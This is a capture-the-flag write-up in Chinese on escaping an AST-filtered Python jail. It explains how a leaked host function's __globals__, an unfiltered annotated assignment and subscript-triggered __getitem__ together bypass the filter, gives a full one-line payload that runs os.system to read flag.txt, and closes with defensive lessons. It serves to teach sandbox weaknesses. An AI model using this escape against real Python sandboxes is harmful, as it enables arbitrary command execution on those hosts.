# Astea

## 题目简述

服务把单行 Python 输入解析为 AST，并用 `NodeTransformer` 替换函数调用、导入、普通赋值和二元运算，最后在空 `__builtins__` 的 `exec` 环境中执行。局部作用域仍暴露了宿主函数 `safe_import` 与 `safe_call`。目标是在不产生 `Call`、`Import`、`Assign` 或 `BinOp` 节点的情况下逃逸 Python jail 并读取 `flag.txt`。

## 解题过程

第一处边界泄漏来自函数对象：`safe_import` 虽被放进受限局部变量，但它的 `__globals__` 仍指向定义该函数的宿主模块，其中的 `__builtins__` 是完整内建模块。因此可以取得可修改的 `quit` 对象及 `__import__`。

第二处漏洞是转换器只实现了 `visit_Assign`，没有拦截带注解赋值 `AnnAssign`。语法 `target: None = value` 仍会执行赋值，却不会被替换成常量零。

最后要绕过 `visit_Call`。下标访问 `obj[arg]` 在 AST 中是 `Subscript` 而非 `Call`，运行时却会调用对象类型的 `__getitem__`。先把 `quit` 所属类的 `__getitem__` 改成 `__import__`，用 `quit["os"]` 导入 `os`；再把同一方法改成 `os.system`，用下标语法执行命令：

```python
quit: None = safe_import.__globals__["__builtins__"].quit; quit.__class__.__getitem__: None = safe_import.__globals__["__builtins__"].__import__; os: None = quit["os"]; quit.__class__.__getitem__: None = os.system; quit["cat flag.txt"]
```

整段 payload 保持在一行，分号只是分隔语句，不会触发 `splitlines()[0]` 截断。服务执行最后一个下标表达式时实际调用 `os.system("cat flag.txt")`，输出：

```text
uiuctf{maybe_we_shouldnt_sandbox_python_2691d6c1}
```

## 方法总结

- AST 黑名单必须覆盖语义等价节点；只过滤 `Assign` 会遗漏 `AnnAssign` 等赋值路径，只过滤 `Call` 也不会阻止协议方法间接调用。
- 把宿主函数暴露给沙箱会连带暴露其 `__globals__`，清空新建 `exec` 字典中的内建对象并不能隔离原函数的定义环境。
- 分析 Python jail 时应从“语法节点如何在运行时触发魔术方法”出发，逐段确认 payload 在转换前后的 AST，而不是只寻找另一种函数调用拼写。
